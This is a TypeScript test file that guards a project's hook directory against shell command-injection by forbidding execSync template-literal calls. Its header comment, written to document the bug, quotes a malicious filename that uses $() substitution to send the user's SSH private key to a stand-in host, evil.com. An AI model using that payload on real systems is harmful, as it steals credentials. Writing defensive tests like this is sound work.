/**
 * Drift-guard test (P-001 / CR-46 structural fix for fix-detector.ts RCE).
 *
 * Background:
 *   A command-injection RCE was found in @massu/core@1.9.3 at
 *   `packages/core/src/hooks/fix-detector.ts:122` / `:124`. The bug:
 *     `execSync(\`git diff -- "${filePath}"\`, ...)`
 *   POSIX filesystems accept `$()` and other shell metacharacters in
 *   filenames; a malicious git repo, npm package, or prompt-injection-
 *   driven Edit call with a filename like
 *     foo$(curl evil.com/$(cat ~/.ssh/id_rsa|base64)).ts
 *   would trigger arbitrary shell execution inside the user's session.
 *
 * Per CR-46, fixing the single call site is not enough — a future
 * contributor adding a new `execSync(\`...${var}...\`)` to any file
 * under `packages/core/src/hooks/` would silently reintroduce the
 * bug class. This test is the structural drift-prevention: it scans
 * every source file under that directory and asserts ZERO matches
 * for the pattern `execSync(\`` (the template-literal call form which
 * is the only form that allows shell-metacharacter injection from a
 * user-controlled variable).
 *
 * Approved alternatives:
 *   - `execFileSync('git', ['diff', '--', filePath], ...)` — argv form,
 *     does NOT invoke a shell, metacharacters in filePath are inert.
 *   - `execSync('static-string-with-no-interpolation', ...)` — also
 *     safe, but use of single-quoted/double-quoted string literals
 *     with `execSync` is still discouraged for consistency.
 *
 * If this test fails after a legitimate change, fix the call site by
 * switching to `execFileSync` with argv. Do NOT add an allowlist
 * unless the operator has approved it with a documented threat-model
 * justification.
 */
import { describe, it, expect } from 'vitest';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { resolve, join } from 'node:path';

const HOOKS_DIR = resolve(__dirname, '../hooks');

function walkTsFiles(dir: string): string[] {
  const out: string[] = [];
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    const st = statSync(full);
    if (st.isDirectory()) {
      out.push(...walkTsFiles(full));
    } else if (entry.endsWith('.ts')) {
      out.push(full);
    }
  }
  return out;
}

describe('hooks-no-shell-execsync (P-001 drift-guard)', () => {
  it('forbids `execSync(`...`)` template-literal calls under packages/core/src/hooks/', () => {
    const offenders: Array<{ file: string; line: number; text: string }> = [];

    // Match `execSync(` immediately followed by a backtick (template
    // literal). This is the exact bug-class shape. Whitespace between
    // `execSync(` and the backtick is tolerated by the regex.
    const pattern = /execSync\s*\(\s*`/;

    for (const file of walkTsFiles(HOOKS_DIR)) {
      const content = readFileSync(file, 'utf-8');
      const lines = content.split('\n');
      lines.forEach((line, idx) => {
        if (pattern.test(line)) {
          offenders.push({ file, line: idx + 1, text: line.trim() });
        }
      });
    }

    if (offenders.length > 0) {
      const report = offenders
        .map((o) => `  ${o.file}:${o.line}\n    ${o.text}`)
        .join('\n');
      throw new Error(
        `Found ${offenders.length} forbidden \`execSync(\\\`...\\\`)\` ` +
          `template-literal call(s) under packages/core/src/hooks/. ` +
          `These permit shell command-injection when any interpolated ` +
          `variable contains attacker-controlled data (e.g., a filename ` +
          `containing \`$()\`). Replace with \`execFileSync('cmd', [...argv], opts)\`.\n\n${report}`
      );
    }

    expect(offenders.length).toBe(0);
  });
});
